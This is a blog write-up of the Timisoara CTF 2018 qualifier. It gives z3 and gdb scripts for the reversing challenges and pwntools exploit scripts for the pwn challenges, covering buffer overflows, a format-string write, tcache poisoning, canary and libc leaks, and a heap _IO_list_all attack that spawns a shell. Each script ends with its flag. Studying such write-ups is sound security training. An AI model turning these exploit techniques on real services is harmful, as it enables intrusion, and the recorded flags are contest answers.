---
layout:     post
title:      "Timisoaractf 2018 quals Write Up"
subtitle:   "Timisoaractf 2018 quals pwnable/reversing"
date:       2018-04-24
author:     "NextLine"
header-img: "img/post-bg-4.png"
tags:
    - WriteUp
---

# 2018 Timisoara CTF quals Write Up

### Info

![ScoreBoard](/img/in-post/timisoaractf2018/board.png)
Nickname : NextLine<br>
Rank : 2



### Math Exam (rev - 150pts)

```python
from z3 import *

pw = [0 for i in range(30)]

for i in xrange(0, 30):
	pw[i] = BitVec('pw[{}]'.format(i), 8)

s = Solver()
s.add(pw[0] == 116)
s.add(pw[1] * 2 == 0xd2)
s.add(pw[2] - pw[3] == 10,pw[2] == 109)
s.add(pw[4] == 116)
s.add(pw[5] + pw[4] == 218)

s.add(pw[6] > 100 , (pw[6]+2) / 5 == 25, pw[6] < 124 )
s.add(2 * pw[7] == 138)
s.add(pw[8] - pw[9] == 18 ,pw[8] == 117)
s.add(pw[10] == 108)
s.add(pw[11] + pw[10] == 213)

s.add(pw[12] == 100)
s.add(2 * pw[13] == 190)
s.add(pw[14] - pw[15] == 71 , pw[14] == 119)
s.add(pw[16] == 117)
s.add(pw[17] + pw[16] == 225)

s.add(pw[18] == 100)
s.add(pw[19] == 95)
s.add(pw[20] % 3 != 20, pw[20] != 0x80, pw[20] > 36 , pw[20] < 0x7f) # check
s.add(pw[20] != 96)
s.add(pw[20] != 64)
s.add(pw[20] != 65)
s.add(pw[20] != 73)
s.add(pw[20] != 100)
s.add(pw[20] == ord('b'))

s.add(pw[21] == 51)
s.add((((pw[22] - 80.0) * (pw[22] - 80.0)) & 0xFF) == 225, pw[22]!=0x41)
s.add(pw[23] + pw[22] == 207)

s.add(pw[24] == 114)
s.add(3 * pw[25] == 144)
s.add(pw[28] + 3 + pw[26] - 6 == 239)
s.add(pw[27] == 100)
s.add(pw[28] == 125)

print s.check()
m = s.model()
flag = ''
for i in range(29):
	flag += chr(int(str(m.evaluate(pw[i]))))
print flag

# sat
# timctf{Euclid_w0uld_b3_pr0ud}
```



### NG Child (rev - 150pts)

```
F8 20 E1 97 3F 37 29 3C 29 DC 00 20 EF BA 29 E8 94 0F 67 FC A8 F8 29 34 20 E1 97 20 49 9E F8 AB 29 40 A1 F1 36 29 50 A1 36 3E 21 D6 00 21 E1 9E 04 F1 6E F5 A1 29 E8 97 3E A2 29 E6 BA 29 E6 9E 38 F7 8E 38 F7 87 31 20 E0 3D 59 B0 E0 31 C0 1E 31 F0 88 00 7F E4 B0 3D F9 A2 31 28 B3 38 F7 B9 38 51 86 21 38 41 B9 23 2B 22 38 87 91 29 C2 00 F0 8A 15 7F E4 B0 38 51 86 8E B2 2A B3 38 8F B6 70 B9 38 28 38 C8 00 34 F0 AB 34 58 B9 38 F9 80 0B E9 76 ED B9 38 20 3C 41 B0 E9 BA B5 31 86 B6 9F B8 20 E1 A8 39 F8 20 97 A8 F8 D9 00 20 97 A0 D8 5C 50 A9 67 FC A9 E0 A0 31 20 49 BA AB A4 9C 29 68 BA 20 37 31 39 20 D7 00 24 E9 97 20 E1 9F 15 6E F5 A1 29 E8 9E 20 3F F1 A2 20 97 A7 15 F1 30 D0 00 2B 42 A3 2B 42 95 2B EA 9C 2B 42 95 F3 E3 98 52 6C F7 A3 38 F3 2B EA 9C A0 2B 42 95 38 23 6A AB 2A 3F FB DB 00 2A E3 AF 2A EB 97 5B 64 FF AB 2A 64 FF AF FB 2A 37 A8 23 6A AB 64 FF A9 21 58 A9 28 3A 3B 28 DA 00 21 58 A9 28 E9 92 07 66 FD AB 21 58 A9 E1 B9 33 28 32 F9 AA 21 E0 B2 99 BE 26 E7 AE 3F FE 26 91 AE FE DF 00 26 91 A6 DE 31 56 AF 61 FA AF E6 A6 37 26 4F BC AD A2 9A 6E A7 26 36 26 D6 00 2A EE B5 2A 46 A7 26 E7 9E 3D F7 68 F3 A7 26 3E 22 5F AE F7 A4 AB 2F 98 A8
```

- tb.txt



```python
import hashlib

md5tb = ["95a196021fa4e9574cd821c9d0ba041f"
,"5795b8d6e2435c5ecdac54375166b544"
,"5cc3e196973fbb79c9aa4e18027f866b"
,"fcc149646e5d3879134804646da90cea"
,"484ec01fb9e6449c0d80a716077702d1"
,"73c0dc9db84acd0c336522043b6fd4e3"
,"b466c3a7d2618bf6f61c6077e3bd6aa0"
,"e73273179f206a7db0d6960e96b84b82"
,"01a3e2b4e7523506929b4e3f3ad6dbbb"
,"bca5b1b2c5716cfd2c2e94cc07c26029"
,"7339e454bbe37d732026780d70d87c9a"
,"b5490761c3a6641e8f54de6a47a35eed"]

data = open('./tb.txt').read()
tb = [int(i,16) for i in data.split()]

for i in range(12):
	for val in range(0xff):
		new = []

		for j in range(32):
			if tb[32 * i + j] == 0:
				new.append('\x00')
			else:
				new.append( chr((tb[32 * i + j] ^ val) % 0x100) )

		m = hashlib.md5()
		m.update("".join(new))
		if m.hexdigest() == md5tb[i]:
			print "FIND : " + m.hexdigest()
			print "Val : " + hex(val)
			break
            
'''
FIND : 95a196021fa4e9574cd821c9d0ba041f
Val : 0x68
FIND : 5795b8d6e2435c5ecdac54375166b544
Val : 0x61
FIND : 5cc3e196973fbb79c9aa4e18027f866b
Val : 0x70
FIND : fcc149646e5d3879134804646da90cea
Val : 0x70
FIND : 484ec01fb9e6449c0d80a716077702d1
Val : 0x79
FIND : 73c0dc9db84acd0c336522043b6fd4e3
Val : 0x68
FIND : b466c3a7d2618bf6f61c6077e3bd6aa0
Val : 0x61
FIND : e73273179f206a7db0d6960e96b84b82
Val : 0x63
FIND : 01a3e2b4e7523506929b4e3f3ad6dbbb
Val : 0x6b
FIND : bca5b1b2c5716cfd2c2e94cc07c26029
Val : 0x69
FIND : 7339e454bbe37d732026780d70d87c9a
Val : 0x6e
FIND : b5490761c3a6641e8f54de6a47a35eed
Val : 0x67
'''
```

- bp.py



```python
import gdb
import time

def bp(add):
	base = 0x555555554000
	return str(base + add)

val = [0x68,0x61,0x70,0x70,0x79,0x68,0x61,0x63,0x6b,0x69,0x6e,0x67]
val2 = [0x67,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0]
# val2 = [103, 101, 110, 101, 114, 52, 116, 49, 48, 110, 0x5f, 0x5a]

for k in range(12,12):
	for j in range(0x20,0x7f):
		gdb.Breakpoint('*' + bp(0x11cf))
		gdb.Breakpoint('*' + bp(0x126b))
		gdb.execute('set follow-fork-mode child')
		gdb.execute('r')
		gdb.execute('set $rip=0x5555555551d4')
		gdb.execute('c')
		gdb.execute('set $rip=0x555555555270')
		gdb.execute('d')
		gdb.Breakpoint('*' + bp(0x12b7)) # read
		gdb.Breakpoint('*' + bp(0x1388)) # win
		gdb.execute('c')

		va1 = hex(val[0])[2:]
		va2 = hex(val2[0])[2:]
		print("va2 : %s / va1 : %s" % (va2, va1))

		gdb.execute('set $rax=0x8')
		gdb.execute('set {long}$rsi=0x000000%s000000%s' % (va2,va1))
		gdb.execute('set $rip=0x5555555552bc')
		gdb.execute('c')

		for i in range(1,k+1):
			va1 = hex(val[i])[2:]
			if val2[i] != 0:
				va2 = hex(val2[i])[2:]
			else :
				va2 = hex(j)[2:]

			print("va2 : %s / va1 : %s" % (va2, va1))
			gdb.execute('set $rax=0x8')
			gdb.execute('set {long}$rsi=0x000000%s000000%s' % (va2,va1))
			gdb.execute('set $rip=0x5555555552bc')
			gdb.execute('c')

		try:
			gdb.execute('p $rip',True,True)
			print("Good : " + hex(j))
			val2[k] = j
			break
		except:
			print("Fail.. : " + hex(j))
			continue
	print(val2)


# val -> [104, 97, 112, 112, 121, 104, 97, 99, 107, 105, 110, 103]
# val2 -> [103, 101, 110, 101, 114, 52, 116, 49, 48, 110, 95, 0]
# val -> happyhacking
# val2 -> gener4t10n_Z

# timctf{gener4t10n_Z}
```

- solve.py



### Teflon (rev - 300pts)

I made binary possible to debug using demovfuscator. And i will found check routine.

```python
from pwn import *
import itertools

# b *strstr
flag_list = ['zihldazjcn', 'vlrgmhasbw', 'jqvanafylz', 'hhqtjylumf', 'yemlopqosj', 'mdcdyamgec', 'nhnewfhetk']
mypermuatation =  itertools.permutations(flag_list)

for i in mypermuatation:
	s = process('./teflon')
	s.sendline("".join(i))
	data = s.recv(1024)
	data += s.recv(1024)
	if data.find('timctf{') != -1:
		print "FIND : " + "".join(i)
		print "FLAG : " + data
		break
	else :
		s.close()

'''
FIND : nhnewfhetkmdcdyamgeczihldazjcnhhqtjylumfvlrgmhasbwjqvanafylzyemlopqosj
FLAG : Congrats. If that is the correct input you will now get a flag
If all you see is garbage, try a different one
timctf{7dfadd1ee67a9c516c9efbf8f0cf43f4}
'''
```



### Attendance (pwn - 50pts)

```python
from pwn import *

s = remote('89.38.210.128',31337)

s.sendlineafter('> ','31337')
s.sendlineafter(': ',p32(0x08048660) * 0x10)

s.interactive()
# timctf{l1ttl3_th1ngs_m4k3_b1g_th1ngs_h4pp3n}
```

- buffer overflow



### Cparty (pwn - 70pts)

```python
from pwn import *

s = remote('89.38.210.128',31338)
s.sendline('A' * 0x20 + p32(0xC0DEFEFE))

s.interactive()
# timctf{d0nt_cr4sh_th3_p4rty_b3_th3_p4rty}
```

- buffer overflow 2



### Memo (pwn - 70pts)

```python
from ntpwn import *


s = remote('89.38.210.128',31339)

p = ("%%%dc" % (0xf0-0x30)) + "%" +str(22) +"$hhn" + "CCCC" + "\x18\x20\x60"

s.sendlineafter('>',p)
s.sendlineafter('?','42')
s.sendlineafter('?','77')
s.sendlineafter('?','111')

s.interactive()
# timctf{t0_4rr1ve_4t_th3_s1mple_is_d1ff1cult}
```

- format string bug



### Heap School 101 (pwn - 150pts)

```python
from pwn import *

s = remote('89.38.210.128',1339)

s.sendlineafter('> ','1')
s.sendlineafter('> ','4')

s.sendlineafter('> ','2')
s.sendline(p64(0x602068))

s.sendlineafter('> ','1')
s.sendlineafter('> ','1')

s.sendlineafter('> ','2')
s.sendline(p64(0x400710))

s.sendlineafter('> ','/bin/sh')

s.interactive()
# timctf{cf921253f9ed4da80fe62e06786200030d76b3e4}
```

- tcache poisoning



### Adrian Pwnescu (pwn - 200pts)

```python
from pwn import *
from ctypes import *
from string import *

s = remote('89.38.210.128',1337)
libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")

s.recvuntil("Today's magic number is ")
seed = int(s.recvline()[:-1],16)
seed = seed%0x100000000

libc.srand(seed)
tab = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ "
up = string.uppercase
flag_data = ''


count = 0
for i in range(100):
	flag = 0
	data = ''
	for i in range(100):
		data += tab[libc.rand() % (len(tab))]
	print data[:10]
	for i in range(11):
		if ord(data[i]) >= ord('A') and ord(data[i]) <= ord('Z'):
			flag = 1
			break

	if flag != 1:
		flag_data = data
		print "OKAY : " + str(count)
		break
	else :
		count += 1

if count == 100:
	log.error("NoNo..")

s.sendafter('please!', flag_data[:10])
for i in range(count):
	s.sendafter('again!\n', flag_data[:10])

s.interactive()
# timctf{a64447f8c8c8bc638ed56a9fdfd7d33c8c760359}
```

- uninitialized stack memory



### Let us go forth and ... sort! (pwn - 250pts)

```python
#from ntpwn import *
from pwn import *

global s
st = 'I Really LOVE soRting ALgoRithMs!'

e = ELF('./letssort')
l = ELF('./libc.so.6')

def conn(f):
	global s

	if f == 1:
		s = process('./letssort')
		#b = BP(s)
		#b.bp('tracemalloc on')
		#b.bp64(0x1128) # read buf2
		#b.bp64(0x1165) # strstr
		#b.bp64(0xf6b)
		#b.bp64(0xc0b) # qsort-compare
		#b.bp64(0xde4) # qsort
		#b.done()
	else :
		s = remote('89.38.210.128',1338)

def go(size,data):
	global s

	s.sendlineafter(' input?\n',str(size))
	s.sendline(data)

for i in range(1):
	global s

	#debug()
	conn(0)
	go(0x1000,'A' * 0x408 + "\x00" + 'B' * 0x18)

	s.recvuntil('A' * 0x408)
	canary = u64(s.recv(8))
	pie = u64(s.recv(8)) - 4576
	libc = u64(s.recv(8)) - l.symbols['__libc_start_main'] - 240
	log.info("CANARY : " + hex(canary))
	log.info("PIE : " + hex(pie))
	log.info("LIBC : " + hex(libc))

	payload = p64(libc+0x45216)
	go(0x5000,('A' * 0x200 + "\x00").ljust(0x808,'B') + p64(canary) + 'B' * 8 + payload)
	go(0x3000,('\x00' * 0x3d0).ljust(0x400,'\x00') + st)

	s.interactive()
	# timctf{291d27631d50ad83e17fcbefa76363d39793aae3}
```

- null byte trick



### Heap School 102 (pwn - 300pts)

```python
#from ntpwn import *
from pwn import *

#s = process('./heapschool2')
s = remote('89.38.210.128',1340)
'''
b = BP(s)
b.bp('tracemalloc on')
b.done()
'''

l = ELF('./libc.so.6')

def go(malloc_size,data,read_size=False):
	s.send(p32(malloc_size))
	if read_size:
		s.send(p32(read_size))
	else :
		s.send(p32(len(data)))
	s.send(data)

go(0x38,'A' * 0x38 + p32(0xfc1))
go(0x1000,'B' * 0x40) # free top chunk
go(0x38,'C' * 0x7+"\n",0x30)
s.recvuntil('C' * 0x7+"\n")

libc = u64(s.recv(8)) - 0x678 - l.symbols['__malloc_hook']
heap = u64(s.recv(8)) - 0x40
log.info("libc : " + hex(libc))
log.info("heap : " + hex(heap))

payload = 'D' * 0x30
payload += '/bin/sh\x00' + p64(0x61)
payload += p64(0) + p64(libc + l.symbols['_IO_list_all'] - 0x10)
payload += p64(0) * 16
payload += p64(heap + 0x140)
payload += p64(0) * 3 + p64(1) + p64(0) * 2
payload += p64(heap + 0x1a0)
payload += p64(libc + l.symbols['system']) * 0x30

go(0x38, payload, 0x300) # unsorted bin attack to "_IO_list_all"

s.sendline(p32(0x100))

s.interactive()
# timctf{a7de738228d6efd95b4bdb8282f0281fc230e316}
```

- simple heap trick
